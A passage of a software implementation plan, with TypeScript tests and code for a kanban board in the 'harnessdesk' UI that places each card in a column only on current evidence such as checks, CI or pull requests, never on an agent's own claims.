  it('finished with nothing checked, it Needs you and says so', () => {
    expect(place()).toEqual({ column: 'needs', why: 'nothing checked' })
    expect(place({ evidence: cardEvidence(1, [diffView()]) })).toEqual({ column: 'needs', why: 'nothing checked' })
  })

  it('abandoned work is set aside, never Ready — whatever was observed on it', () => {
    expect(place({ intent: intent({ state: 'abandoned' }) })).toEqual({ column: 'aside', why: null })
    expect(place({ intent: intent({ state: 'abandoned' }), evidence: cardEvidence(1, [checkView(), prView('merged')]) })).toEqual({ column: 'aside', why: null })
  })
})

describe('a message is never evidence', () => {
  it('an agent saying the tests pass — in its finish note, its outcome, its hand-off — moves nothing', () => {
    const said = intent({ note: 'verify passed, all tests pass — ready to merge', outcome: 'pass', handoff: 'All green.' })
    expect(place({ intent: said })).toEqual({ column: 'needs', why: 'nothing checked' })
    expect(place({ intent: { ...said, state: 'claimed', claim: HELD } })).toEqual({ column: 'working', why: null })
  })
})

describe('a card a flow addressed to the person', () => {
  const run = (intents: readonly number[]): FlowRun =>
    ({
      state: 'running',
      flow: { roles: [{ id: 'approver', kind: 'person', outcomes: ['approve', 'reject'] }] },
      rounds: [{ n: 1, role: 'approver', intents, openedAt: 1 }],
    }) as unknown as FlowRun

  it("is the running flow's only when one of that run's rounds opened it", () => {
    const card = intent({ id: 7, state: 'open', role: 'approver' })
    expect(flowRoleOf(card, run([7]))?.kind).toBe('person')
    // Left open by an earlier run that was stopped: a new run reusing the role's name did not address it.
    expect(flowRoleOf(card, run([3, 4]))).toBeNull()
    expect(flowRoleOf(card, undefined)).toBeNull()
    expect(flowRoleOf(intent({ id: 7, state: 'open' }), run([7]))).toBeNull()
  })
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/lib/board-facts.test.ts`
Expected: FAIL — `Failed to resolve import "./board-facts"`.

- [ ] **Step 3: The rule**

Create `packages/ui/src/lib/board-facts.ts`:

```ts
import type { CardEvidence, EvidenceView, FlowRole, FlowRun, Intent } from '@harnessdesk/protocol'

import { checkPassed, ciVerdict, isCurrent } from './evidence'

/**
 * Where a card belongs, from the facts.
 *
 * The board's columns are not places a card is put; they are what is known
 * about it. *To do* is work nobody has started. *Working* is work its holder is
 * on. *Needs you* is work that cannot move without a person: stopped, stranded,
 * waiting on an answer, failed, cancelled, out of date, unknown, or finished
 * with nothing checked. *In review* is finished work whose evidence is still
 * arriving — a check running, CI running, a pull request open. *Ready* is
 * finished work a **current** fact says is good: a fresh passing check, fresh
 * passing CI, or a merged pull request that is fresh — or final, when its
 * branch is gone and nothing can land on it any more. *Set aside* is work a
 * person dropped: settled, never good news, and drawn only while it holds
 * something.
 *
 * A column moves on a check, a diff, a pull request or CI — never on anybody
 * saying the work is done. Nothing here reads a message, and a card's own
 * words — its note, its outcome, its hand-off — are what an agent said, so
 * they move nothing either. A card finished with a note that the tests pass,
 * and nothing observed, waits in *Needs you*, and says so.
 */

export type FactColumn = 'todo' | 'working' | 'needs' | 'review' | 'ready' | 'aside'

/** The columns, in the order work moves through them; *Set aside* last, and only drawn while it holds a card. */
export const FACT_COLUMNS: readonly { readonly id: FactColumn; readonly title: string }[] = [
  { id: 'todo', title: 'To do' },
  { id: 'working', title: 'Working' },
  { id: 'needs', title: 'Needs you' },
  { id: 'review', title: 'In review' },
  { id: 'ready', title: 'Ready' },
  { id: 'aside', title: 'Set aside' },
]

export interface Placement {
  readonly column: FactColumn
  /**
   * Why the card is where it is, when the column cannot say it alone — which
   * fact put it in *Needs you*, or what it waits for — short enough for the
   * chip a card wears. Null when the column says everything.
   */
  readonly why: string | null
}

export interface PlaceInput {
  readonly intent: Intent
  /** What the desk observed on it; undefined when nothing. */
  readonly evidence: CardEvidence | undefined
  /** Its claim has lapsed and its holder has gone (`strandedFor`): someone has to take it over. */
  readonly stranded: boolean
  /** Its holder is waiting on a person: an approval it asked for. */
  readonly holderWaits: boolean
  /** The running flow addressed it to the person: a step of that run only they can answer (`flowRoleOf`). */
  readonly forPerson: boolean
}

/**
 * The role the running flow holds a card to, or null. Only a card one of the
 * run's own rounds opened is that run's: a card left open by an earlier run
 * that was stopped keeps its role's name, and a new run that happens to reuse
 * the name has not addressed it to anyone.
 */
export const flowRoleOf = (intent: Intent, run: FlowRun | undefined): FlowRole | null => {
  if (!intent.role || !run) return null
  if (!run.rounds.some((round) => round.intents.includes(intent.id))) return null
  return run.flow.roles.find((one) => one.id === intent.role) ?? null
}

/** What a fact that can make a card Ready is called on its chip. */
const subjectOf = (view: EvidenceView): string | null => {
  const fact = view.record.fact
  switch (fact.kind) {
    case 'check':
      return fact.name
    case 'ci':
      return 'CI'
    case 'pr':
      return `PR #${fact.number}`
    default:
      return null
  }
}

/** Why a fact that could decide the card does not: it is out of date, or nobody can say. Null when it is current, or decides nothing. */
const notCurrent = (view: EvidenceView): string | null => {
  const subject = subjectOf(view)
  if (subject === null || isCurrent(view.freshness)) return null
  return view.freshness.state === 'unknown' ? `${subject} unknown` : `${subject} out of date`
}

/** Where finished work stands: on its current facts alone. */
const settled = (evidence: CardEvidence | undefined): Placement => {
  const facts = evidence?.facts ?? []
  const current = facts.filter((view) => isCurrent(view.freshness))
  // A current failure is the news, whatever else passed. Cancelled CI is not a pass, and says so.
  for (const view of current) {
    const fact = view.record.fact
    if (fact.kind === 'check' && !checkPassed(fact)) return { column: 'needs', why: `${fact.name} failed` }
    if (fact.kind === 'ci' && ciVerdict(fact.checks) === 'failed') return { column: 'needs', why: 'CI failed' }
    if (fact.kind === 'ci' && ciVerdict(fact.checks) === 'cancelled') return { column: 'needs', why: 'CI cancelled' }
    if (fact.kind === 'pr' && fact.state === 'closed') return { column: 'needs', why: `PR #${fact.number} closed` }
  }
  // Ready needs a current fact that says the work is good.
  for (const view of current) {
    const fact = view.record.fact
    if (fact.kind === 'pr' && fact.state === 'merged') return { column: 'ready', why: null }
    if (fact.kind === 'check' && checkPassed(fact)) return { column: 'ready', why: null }
    if (fact.kind === 'ci' && ciVerdict(fact.checks) === 'passed') return { column: 'ready', why: null }
  }
  // Evidence still arriving.
  const running = evidence?.running[0]
  if (running) return { column: 'review', why: `${running.name} running` }
  for (const view of current) {
    const fact = view.record.fact
    if (fact.kind === 'ci' && ciVerdict(fact.checks) === 'running') return { column: 'review', why: 'CI running' }
    if (fact.kind === 'pr' && fact.state === 'open') return { column: 'review', why: `PR #${fact.number} open` }
  }
  // A fact that is not current is no verdict: the card waits for someone to look again, and says which fact, and how.
  for (const view of facts) {
    const why = notCurrent(view)
    if (why !== null) return { column: 'needs', why }
  }
  return { column: 'needs', why: 'nothing checked' }
}

export const placeCard = ({ intent, evidence, stranded, holderWaits, forPerson }: PlaceInput): Placement => {
  switch (intent.state) {
    case 'abandoned':
      // Dropped, not finished: never Ready, whatever was observed on it.
      return { column: 'aside', why: null }
    case 'blocked':
      return intent.blockedBy === 'hand' ? { column: 'needs', why: 'stopped' } : { column: 'todo', why: null }
    case 'open':
      return forPerson ? { column: 'needs', why: 'needs your answer' } : { column: 'todo', why: null }
    case 'claimed':
      // A stranded card says how long on its own chip.
      if (stranded) return { column: 'needs', why: null }
      if (holderWaits) return { column: 'needs', why: 'waiting on you' }
      return { column: 'working', why: null }
    case 'done':
      return settled(evidence)
  }
}
```

- [ ] **Step 4: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/lib/board-facts.test.ts`
Expected: PASS — 14 tests.

- [ ] **Step 5: Prove the tests can fail**

1. **A stale fact counts.** In `settled`, make the second loop run over `facts` instead of `current`: `a pass that has gone stale is not a pass…` and `a merged pull request is no exception: out of date or unknown, it is no verdict` fail. Restore it.
2. **A message counts.** Change the `case 'done':` return to `return intent.note?.includes('pass') ? { column: 'ready', why: null } : settled(evidence)`: `an agent saying the tests pass — in its finish note, its outcome, its hand-off — moves nothing` fails. Restore it.
3. **Finished is enough.** Change the last line of `settled` to `return { column: 'ready', why: null }`: `finished with nothing checked, it Needs you and says so` fails. Restore it.
4. **Cancelled says nothing.** Delete the `cancelled` line from the first loop: `cancelled CI is not a pass, alone or beside passes` fails — the card falls through to *nothing checked*. Restore it.
5. **Abandoned is Ready.** Change the `abandoned` case to `return { column: 'ready', why: null }`: `abandoned work is set aside, never Ready — whatever was observed on it` fails. Restore it.
6. **Only checks say how they stand.** In `notCurrent`, return null unless `view.record.fact.kind === 'check'`: `every fact that could decide a card says which it is, and how it stands, when it is not current` fails on `CI out of date`. Restore it.
7. **Any run addresses the card.** In `flowRoleOf`, delete the `rounds` line: `is the running flow's only when one of that run's rounds opened it` fails. Restore it.

- [ ] **Step 6: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/lib/board-facts.ts packages/ui/src/lib/board-facts.test.ts
git commit -m "feat(evidence): where a card belongs, from the facts

To do, Working, Needs you, In review, Ready, Set aside — each from a card's
state and what the desk observed on it. Ready needs a current fact: a fresh
passing check, fresh passing CI, or a merged pull request that is fresh or
final, its branch gone. Cancelled CI is not a pass; abandoned work is set
aside, never Ready; a fact from a backup is unknown and decides nothing. A
card finished with nothing checked, or with a fact out of date or unknown,
needs you and says which — verify, CI or the pull request. A flow addresses a
card to you only when its own round opened it. Nothing anyone says moves a
card: not a message, not a finish note, not an outcome.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 19: The board's columns come from the facts

> **Prerequisite:** `4382ded9` from `claude/ui-roles` — cherry-pick it, or the roles PR once it is on main. This task draws the board as `<Board derived>`: no drag, no add slot in any column whatever it is passed, and an empty column that says *Nothing here*.

The board's columns become *To do · Working · Needs you · In review · Ready*, and *Set aside* while it holds anything, and every card sits where `placeCard` (Task 18) puts it: its state, what the desk observed on it, whether its claim is stranded, whether its holder waits on an approval, and whether the running flow's own round addressed it to the person (`flowRoleOf`). Nothing is dragged — there is no column to put a card in, only the one its facts put it in — so the drop, its refusals and its outlines go, and every verb a drop performed stays in the card's menu, where a keyboard always reached it. No column takes a title either: the quick add at a column's foot goes, and work goes on through the header's *New job*, the empty board's *Add the first job*, and an agent's `add_intent`. An empty column says so — the derived board draws that itself. A card in *Needs you* wears which fact put it there: *verify failed*, *CI cancelled*, *nothing checked*, *verify out of date*, *PR #12 unknown*, *waiting on you*. Work set aside wears nothing: its column says it. This reverses one old rule on purpose: a stranded claim now moves to *Needs you*, because somebody has to take it over.

**Files:**
- Modify: `packages/ui/src/components/TeamBoardPane.tsx` (derived columns; no drag; no quick add; *Set aside*; a card's reason; a flow's role only for its own rounds)
- Test, named edits: `packages/ui/src/components/TeamBoardPane.test.tsx` — the `rig` also returns its snapshot; the tests that named the old columns or dragged are rewritten, the quick add's three are deleted, the stalled-run test's run gains its round, as listed in Step 2; five are appended

**Proof needs:** the rendered UI

**Interfaces:**
- Consumes: `FACT_COLUMNS`, `flowRoleOf`, `placeCard`, `FactColumn`, `Placement` (Task 18); `AppSnapshot.approvals` (`PendingApproval.key` is the waiting conversation's `SessionKey`); `AppSnapshot.flowRuns` (a role of kind `person`, and the run's `rounds`); `strandedFor` (this file); `Board` with `derived` (`4382ded9`).
- Produces: nothing new; `TeamBoardPane` draws the derived board.

- [ ] **Step 1: Confirm the derived board and the anchors**

Run: `grep -n "derived\|board-empty" packages/ui/src/design/ui/board.tsx; grep -n "type ColumnId\|const columnOf\|const dropOn\|const drop = \|<Board wrap>\|onAddTitle: add" packages/ui/src/components/TeamBoardPane.tsx`
Expected: `Board` takes `derived`, sets `data-derived`, and draws `board-empty` for an empty column; and the six anchors this task removes. If `derived` is missing, stop and report.

- [ ] **Step 2: Rewrite the tests that named the old columns or dragged**

In `packages/ui/src/components/TeamBoardPane.test.tsx`. Each of these is an edit to a test this plan did not write; each says what the board does now.

1. The `rig` returns its snapshot too — replace `  return { store }` at its end with:

```tsx
  /* The snapshot too, for the one kind of state a board reads that is not the
     board's own: an approval its holder is waiting on. */
  return { store, snapshot }
```

2. Replace `it('columns are the states, so no card has to repeat its own', …)` with:

```tsx
it('columns are what is known about the work, so no card has to repeat its own', async () => {
  const { store } = rig([
    intent({ id: 1, state: 'open' }),
    intent({ id: 2, state: 'claimed', title: 'Integration tests' }),
  ])
  await render(store)

  /* *To do* for work nobody has started, and the spec's four for the rest:
     the engine's states are still `open` and `claimed`, but a column says what
     is known about the work, not which state it is in. */
  expect([...container.querySelectorAll('[data-slot="board-column"] h3')].map((one) => one.textContent)).toEqual([
    'To do',
    'Working',
    'Needs you',
    'In review',
    'Ready',
  ])
  expect(column('To do').textContent).toContain('#1')
  expect(column('Working').textContent).toContain('Integration tests')
  expect(container.textContent).toContain('src/api/**')
})
```

3. Replace the comment `/** Moving work by dragging it. … */` and the three tests after it — `'dropping a card on Done marks it done'`, `'dropping a claimed card on Ready takes it back off its holder'`, and, with its comment `/** The honest half. … */`, `'says why a column will not take the card, while the card is in the air'` — with:

```tsx
/**
 * Nothing is dragged.
 *
 * A column is what is known about a card, so there is no column to put one in:
 * the board is derived. Every verb a drop used to perform is in the card's
 * menu, which is also how a keyboard always reached them.
 */
it('no card is dragged, and no column takes a drop', async () => {
  const { store } = rig([intent({ state: 'open' })])
  await render(store)

  expect(card('Migrate auth callers').getAttribute('draggable')).toBeNull()
  act(() => card('Migrate auth callers').dispatchEvent(drag('dragstart')))
  act(() => column('Ready').dispatchEvent(drag('dragover')))
  act(() => column('Ready').dispatchEvent(drag('drop')))
  await act(async () => {})
  expect(store.teamIntent).not.toHaveBeenCalled()
})

it('what a drop did is in the card’s menu: done, and taking work back off its holder', async () => {
  const { store } = rig([
    intent({ id: 1, state: 'open' }),
    intent({ id: 2, state: 'claimed', title: 'Round the totals', claim: { runtime: 'codex', sessionId: 'c1', at: 1 } }),
  ])
  await render(store)

  await pick(1, 'Mark done')
  expect(store.teamIntent).toHaveBeenCalledWith(ROOM, 1, 'done')
  await pick(2, 'Take it back off')
  expect(store.teamIntent).toHaveBeenLastCalledWith(ROOM, 2, 'release')
})
```

4. In the comment above the stopping tests, replace "because a card in Blocked that does not say what stopped it sends the next reader to the channel, which is the trip the board exists to save." with "because a stopped card that does not say what stopped it sends the next reader to the channel, which is the trip the board exists to save." Then replace `'dropping a card on Blocked asks why before it stops anything'` and `'cancelling the question leaves the card where it was'` with:

```tsx
it('stopping a card asks why before it stops anything', async () => {
  const { store } = rig([intent({ state: 'open' })])
  await render(store)

  await pick(1, 'Stop it — say why')
  // Nothing has happened yet — the question is the point.
  expect(store.teamIntent).not.toHaveBeenCalled()
  const why = document.querySelector<HTMLInputElement>('input[aria-label="Why it is stopped"]')
  if (!why) throw new Error('nobody was asked why')
  act(() => {
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set?.call(
      why,
      'waiting on the rename',
    )
    why.dispatchEvent(new Event('input', { bubbles: true }))
  })
  const stop = [...document.querySelectorAll('button')].find(
    (one) => one.textContent?.trim() === 'Stop it',
  )
  act(() => stop?.click())
  await act(async () => {})

  expect(store.teamIntent).toHaveBeenCalledWith(ROOM, 1, 'block', 'waiting on the rename')
})

it('cancelling the question leaves the card where it was', async () => {
  const { store } = rig([intent({ state: 'open' })])
  await render(store)

  await pick(1, 'Stop it — say why')
  const cancel = [...document.querySelectorAll('button')].find(
    (one) => one.textContent?.trim() === 'Cancel',
  )
  act(() => cancel?.click())
  await act(async () => {})

  expect(store.teamIntent).not.toHaveBeenCalled()
  expect(document.querySelector('input[aria-label="Why it is stopped"]')).toBeNull()
  expect(column('To do').textContent).toContain('Migrate auth callers')
})
```

5. The quick path goes: a derived board takes no title in a column. Delete the helpers `typeInto`, `openQuickAdd` and `quickAdd` with their comments (*"React tracks the value setter…"*, *"The quick path, which lives at the foot of Ready…"*); delete the comment *"Two doors, and the small one is the common one."* and the tests `'adds work from the slot at the foot of Ready'` and `'a title the host refuses is said back, in the words that were typed'`; and delete the comment *"The quick path is a shortcut and never a mode."* and `'Escape leaves the quick add, and takes the half-typed title with it'`. Each is a named deletion of a test this plan did not write: what it pinned is gone on purpose. Directly above the comment *"Adding work, asking for what work actually has."*, add:

```tsx
/**
 * A derived board takes no title in a column.
 *
 * The columns are facts, so there is no column for new work to land in: the
 * design system's derived board draws no add slot whatever it is passed, and
 * says so of an empty column. Work goes on through the header's door.
 */
it('the board is derived: no column takes a title, and an empty one says so', async () => {
  const { store } = rig([intent({ state: 'open' })])
  await render(store)

  expect(container.querySelector('[data-slot="board"]')?.hasAttribute('data-derived')).toBe(true)
  expect(container.querySelector('[data-slot="board-add"]')).toBeNull()
  expect(column('Working').querySelector('[data-slot="board-empty"]')?.textContent).toBe('Nothing here')
  expect(column('To do').querySelector('[data-slot="board-empty"]')).toBeNull()
})
```

6. Replace `'abandoned work is settled but does not sit in Done looking finished'` with:

```tsx
it('work set aside has a column of its own, drawn only while it holds something, and is never Ready', async () => {
  const { store } = rig(
    [intent({ id: 1, state: 'abandoned', title: 'Given up on' }), intent({ id: 2, state: 'done', title: 'Checked and fresh' })],
    {},
    observed(['verify'], [cardEvidence(1, [checkView({ card: 1 })]), cardEvidence(2, [checkView({ card: 2 })])]),
  )
  await render(store)

  expect([...container.querySelectorAll('[data-slot="board-column"] h3')].map((one) => one.textContent)).toEqual([
    'To do',
    'Working',
    'Needs you',
    'In review',
    'Ready',
    'Set aside',
  ])
  // A fresh pass on it changes nothing: dropped work is not good work.
  expect(column('Set aside').textContent).toContain('Given up on')
  expect(column('Ready').textContent).not.toContain('Given up on')
  expect(column('Ready').textContent).toContain('Checked and fresh')
})
```

7. Replace `'separates work waiting on its dependencies from work somebody stopped'` with:

```tsx
it('separates work waiting on its dependencies from work somebody stopped', async () => {
  const waiting = {
    id: 1,
    title: 'Review the rounding change',
    state: 'blocked',
    blockedBy: 'graph',
    files: [],
    dependsOn: [2],
    createdAt: 0,
    updatedAt: 0,
  }
  const stopped = {
    id: 2,
    title: 'Migrate the pricing table',
    state: 'blocked',
    blockedBy: 'hand',
    blockedReason: 'needs a staging dump first',
    files: [],
    dependsOn: [],
    createdAt: 0,
    updatedAt: 0,
  }
  const { store } = rig([waiting, stopped] as never)
  await render(store)

  // Waiting on the graph is work nobody can start yet; stopped work needs a person to reopen it.
  expect(column('To do').textContent).toContain('Review the rounding change')
  expect(column('To do').textContent).not.toContain('Migrate the pricing table')
  expect(column('Needs you').textContent).toContain('Migrate the pricing table')
  expect(column('Needs you').textContent).not.toContain('Review the rounding change')
})
```

8. Replace the comment `/** A card does not repeat its own state. … */` and `'says the state in the column, not on the card — except where the column cannot'` with:

```tsx
/**
 * A card does not repeat its own column.
 *
 * What it does say is what the column cannot: which of the many reasons put
 * it in *Needs you*. Work set aside has a column of its own, so it wears no
 * chip to tell it from good work.
 */
it('says what the column cannot: why a card needs you — and work set aside needs no chip to say so', async () => {
  const { store } = rig([
    intent({ id: 1, state: 'blocked', blockedBy: 'graph', title: 'Waits on the graph' }),
    intent({ id: 2, state: 'blocked', blockedBy: 'hand', title: 'Somebody stopped it' }),
    intent({ id: 3, state: 'abandoned', title: 'Given up on' }),
  ] as never)
  await render(store)

  // Waiting on the graph wears nothing; its column already said it.
  expect(column('To do').textContent).toContain('Waits on the graph')
  expect(column('To do').textContent).not.toContain('blocked')
  expect(column('To do').textContent).not.toContain('stopped')
  // Needs you is many reasons, so the card says which.
  expect(column('Needs you').textContent).toContain('Somebody stopped it')
  expect(column('Needs you').textContent).toContain('stopped')
  // Set aside says so by its column, so the card does not repeat it.
  expect(column('Set aside').textContent).toContain('Given up on')
  expect(card('Given up on').textContent).not.toContain('abandoned')
})
```

9. Replace the comment `/** A stranded claim looks stranded. … */` and `'says when a claim has run out, and leaves it where it was'` with:

```tsx
/**
 * A stranded claim needs a person.
 *
 * On paper the work still has an owner, and the point is that the paper has
 * gone stale — so it waits in *Needs you* for somebody to take it over, and
 * says how long it has been stranded.
 */
it('a claim that has run out needs you, and says how long', async () => {
  const stale = intent({
    id: 1,
    state: 'claimed',
    title: 'Migrate the callers',
    claim: { runtime: 'codex', sessionId: 'gone', at: 1, leaseUntil: Date.now() - 3 * 60 * 60 * 1000 },
  })
  const live = intent({
    id: 2,
    state: 'claimed',
    title: 'Round the totals',
    claim: { runtime: 'codex', sessionId: 'c1', at: 1, leaseUntil: Date.now() + 60 * 60 * 1000 },
  })
  const { store } = rig([stale, live] as never)
  await render(store)

  expect(column('Needs you').textContent).toContain('Migrate the callers')
  expect(column('Needs you').textContent).toContain('stranded 3h')
  expect(column('Working').textContent).toContain('Round the totals')
  // Only the lapsed one says so.
  expect(container.textContent?.match(/stranded/g) ?? []).toHaveLength(1)
})
```

10. In `'displays the card role when the flow run is stalled (#557)'`, the stalled run's `rounds: []` becomes `rounds: [{ n: 1, role: 'person', intents: [1], openedAt: 1 }]` — a run's role is only for the cards its own rounds opened — and directly after that test add:

```tsx
it("a card an earlier run left open is not the person's step because a new run reuses its role's name", async () => {
  const leftOver = intent({ id: 1, state: 'open', role: 'person', title: 'Approve the old plan' })
  const { store, snapshot } = rig([leftOver])
  const newRun = {
    id: 'flow-run-2',
    room: ROOM,
    state: 'running' as const,
    startedAt: 2,
    vars: {},
    flow: {
      name: 'Review flow',
      roles: [{ id: 'person', name: 'Person', kind: 'person', count: 1, outcomes: ['approve'] }],
      rules: [],
      inputs: [],
    },
    seats: [],
    // Its own round opened card 9, not card 1.
    rounds: [{ n: 1, role: 'person', intents: [9], openedAt: 2 }],
    record: [],
  }
  Object.assign(snapshot, { flowRuns: new Map([[ROOM, [newRun]]]) })
  await render(store)

  expect(column('To do').textContent).toContain('Approve the old plan')
  expect(column('Needs you').textContent).not.toContain('Approve the old plan')
  const labels = (await menuItems(1)).map((one) => one.textContent?.trim())
  expect(labels).not.toContain('Answer approve')
  expect(labels).toContain('Mark done')
})
```

11. Add `ciView` to the import from `../preview/evidence-fixture`, and append:

```tsx
/**
 * The columns come from the facts.
 *
 * Finished work is *Ready* only on a fact — a fresh passing check, fresh
 * passing CI, a merged pull request. Without one it waits in *Needs you* and
 * says why; with evidence still arriving it is *In review*; and a check that
 * went stale when a commit landed puts it back in *Needs you* until the check
 * runs again.
 */
it('finished work is Ready only on a fact, and says which fact when it needs you', async () => {
  const { store } = rig(
    [
      intent({ id: 1, state: 'done', title: 'Checked and fresh' }),
      intent({ id: 2, state: 'done', title: 'Nothing checked' }),
      intent({ id: 3, state: 'done', title: 'Checked, then a commit landed' }),
      intent({ id: 4, state: 'done', title: 'Being checked now' }),
      intent({ id: 5, state: 'done', title: 'CI was cancelled' }),
      intent({ id: 6, state: 'done', title: 'Merged, from a backup' }),
    ],
    {},
    observed(['verify'], [
      cardEvidence(1, [checkView({ card: 1 })]),
      cardEvidence(3, [checkView({ card: 3, freshness: { state: 'behind', commits: 1 } })]),
      cardEvidence(4, [], [{ name: 'verify', since: 1 }]),
      cardEvidence(5, [ciView(['passed', 'cancelled'], { card: 5 })]),
      cardEvidence(6, [prView('merged', { card: 6, freshness: { state: 'unknown', why: 'it came from a backup, and this desk has not observed it' } })]),
    ]),
  )
  await render(store)

  expect(column('Ready').textContent).toContain('Checked and fresh')
  expect(column('Needs you').textContent).toContain('Nothing checked')
  expect(card('Nothing checked').textContent).toContain('nothing checked')
  expect(column('Needs you').textContent).toContain('Checked, then a commit landed')
  expect(card('Checked, then a commit landed').textContent).toContain('verify out of date')
  expect(column('In review').textContent).toContain('Being checked now')
  // Cancelled CI is not a pass, and a merged pull request nobody here observed is no verdict.
  expect(card('CI was cancelled').textContent).toContain('CI cancelled')
  expect(column('Needs you').textContent).toContain('CI was cancelled')
  expect(card('Merged, from a backup').textContent).toContain('PR #12 unknown')
  expect(column('Ready').textContent).not.toContain('Merged, from a backup')
})

it('a message between agents is never evidence: the channel and a finish note saying the tests pass move nothing', async () => {
  const said = {
    id: 'm1',
    at: 1,
    kind: 'message',
    from: { kind: 'agent', runtime: 'codex', sessionId: 'c1', title: 'API migration' },
    to: { runtime: 'claude', sessionId: 'k1', title: 'Auth refactor' },
    text: 'verify passed on #1, all tests pass — ready to merge',
    state: 'delivered',
  }
  const { store } = rig(
    [
      intent({ id: 1, state: 'done', title: 'Said to pass', note: 'All tests pass.', outcome: 'pass' }),
      intent({ id: 2, state: 'claimed', title: 'Said to be done', claim: { runtime: 'codex', sessionId: 'c1', at: 1 } }),
    ],
    { channel: [said] } as unknown as Partial<TeamState>,
    observed(['verify'], []),
  )
  await render(store)

  expect(column('Needs you').textContent).toContain('Said to pass')
  expect(card('Said to pass').textContent).toContain('nothing checked')
  expect(column('Ready').textContent).not.toContain('Said to pass')
  expect(column('Working').textContent).toContain('Said to be done')
})

it('work whose holder is waiting on an answer needs you, and says so', async () => {
  const { store, snapshot } = rig([
    intent({ state: 'claimed', claim: { runtime: 'codex', sessionId: 'c1', at: 1 } }),
  ])
  Object.assign(snapshot, { approvals: [{ key: sessionKey('codex', 'c1'), approval: {} }] })
  await render(store)

  expect(column('Needs you').textContent).toContain('Migrate auth callers')
  expect(card('Migrate auth callers').textContent).toContain('waiting on you')
})
```

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/TeamBoardPane.test.tsx`
Expected: FAIL — the rewritten and appended tests, starting with `no column named To do`.

- [ ] **Step 4: The columns are the facts**

In `packages/ui/src/components/TeamBoardPane.tsx`:

1. Add `import { FACT_COLUMNS, flowRoleOf, placeCard, type FactColumn, type Placement } from '../lib/board-facts'` after `import { runtimeTint } from '../lib/accounts'`.
2. In the file's opening comment, replace the *Moving work.* entry with:

```tsx
 *   Moving work.       The verbs were on every card as a row of three ghost
 *                      buttons, which cost the width the title needed and
 *                      still made "this is done" a hunt for the right word.
 *                      They live behind one ⋮ now.
```

   and replace its last paragraph, *"Dragging is a *shortcut*, never the only way: …"*, with:

```tsx
 * Nothing is dragged. The columns are what is known about each card — its
 * state and what the desk observed on it — so there is no column to put a card
 * in, only the one its facts put it in (`lib/board-facts.ts`). Every verb a
 * drop used to perform is in the card's menu, and a card in *Needs you* says
 * which fact put it there.
```

3. Replace the comment *"The board's columns, in the order work moves through them — and why there are five rather than four."*, `type ColumnId = …` and `const COLUMNS = [ … ]` with:

```tsx
/**
 * The board's columns, in the order work moves through them — *To do*,
 * *Working*, *Needs you*, *In review*, *Ready*, and *Set aside* while anything
 * is — and which card sits in which is `placeCard`'s to say, from the card's
 * state and what the desk observed.
 *
 * Tints identify a column, as on every board; none of them judges it. *Needs
 * you* keeps the amber *Blocked* had, because stopped work is still where it
 * goes, and work nobody has started keeps *Waiting*'s quiet teal.
 *
 * Prerequisite: the design system's derived board, toned chips and menu
 * reasons (`4382ded9` on `claude/ui-roles`, or the roles pull request once it
 * is on main).
 */
const TINTS: Readonly<Record<FactColumn, Tint>> = {
  todo: 'teal',
  working: 'sky',
  needs: 'amber',
  review: 'violet',
  ready: 'green',
  aside: 'blue',
}

const COLUMNS: readonly { id: FactColumn; title: string; tint: Tint }[] = FACT_COLUMNS.map((column) => ({
  ...column,
  tint: TINTS[column.id],
}))
```

4. In `strandedFor`'s comment, replace its last paragraph (*"A stranded card stays in Claimed rather than moving: …"*) with:

```tsx
 * A stranded card moves to *Needs you*: the work has an owner on paper and the
 * paper has gone stale, so it waits for a person to take it over — and its
 * chip still says how long it has been stranded.
```

5. Delete `columnOf` with its comment (*"Abandoned work is settled but not done…"*), and `dropOn` with its comment (*"What dropping this card on that column would do — or why nothing happens."*).
6. In `TeamBoardPane`, delete the `dragging` and `over` state and their comment; delete the `const byColumn = useMemo(…)` that follows `openCards`; delete `const drop = (to: ColumnId): void => { … }`; delete `add` and its comment (*"A title, straight onto the board."*) — no column takes a title; and replace `const inFlight = …` with:

```tsx
  /* Where each card belongs, from what is known about it (lib/board-facts.ts).
     Its holder waits on a person while an approval it asked for is open; a
     flow addresses a card to the person when one of the running flow's own
     rounds opened it for a role that is theirs to answer. */
  const waiting = useMemo(() => new Set(snapshot.approvals.map((one) => one.key)), [snapshot.approvals])
  const flowRun = (snapshot.flowRuns.get(room) ?? []).find((one) => one.state === 'running' || one.state === 'stalled')
  const placed = useMemo(() => {
    const out = new Map<number, Placement>()
    for (const intent of intents) {
      const role = flowRoleOf(intent, flowRun)
      out.set(
        intent.id,
        placeCard({
          intent,
          evidence: evidence?.cards.find((one) => one.card === intent.id),
          stranded: strandedFor(intent, now, attached) !== null,
          holderWaits: intent.claim
            ? waiting.has(sessionKey(intent.claim.runtime, intent.claim.sessionId as SessionId))
            : false,
          forPerson: role?.kind === 'person',
        }),
      )
    }
    return out
  }, [intents, evidence, now, attached, waiting, flowRun])
  const byColumn = useMemo(() => {
    const out = new Map<FactColumn, Intent[]>()
    for (const column of COLUMNS) out.set(column.id, [])
    for (const intent of intents) out.get(placed.get(intent.id)?.column ?? 'todo')?.push(intent)
    return out
  }, [intents, placed])
  /* *Set aside* only while it holds something: dropped work is rare, and a
     sixth column standing empty would be a place the board says nothing. */
  const shown = COLUMNS.filter((column) => column.id !== 'aside' || (byColumn.get('aside')?.length ?? 0) > 0)
```

7. In the header's comment, replace its last paragraph — from *"The quick path is not lost, it has moved to where the card lands:"* to its close — with:

```tsx
             There is no quick path in a column any more: the columns are
             facts, and a derived board takes no title in one. What is here
             is what a header is for — the whole-board actions, with the loud
             one last, which is the order the reference draws and the order
             macOS reads. */
```

   and replace the subtitle's template with:

```tsx
            : `${byColumn.get('todo')?.length ?? 0} to do · ${
                byColumn.get('working')?.length ?? 0
              } working · ${byColumn.get('needs')?.length ?? 0} need you`
```

8. Replace the whole board — from the comment `/* Wrapped, not scrolled: five fixed states …` through `</Board>` — with the derived board, which draws the empty column's words and no add slot itself:

```tsx
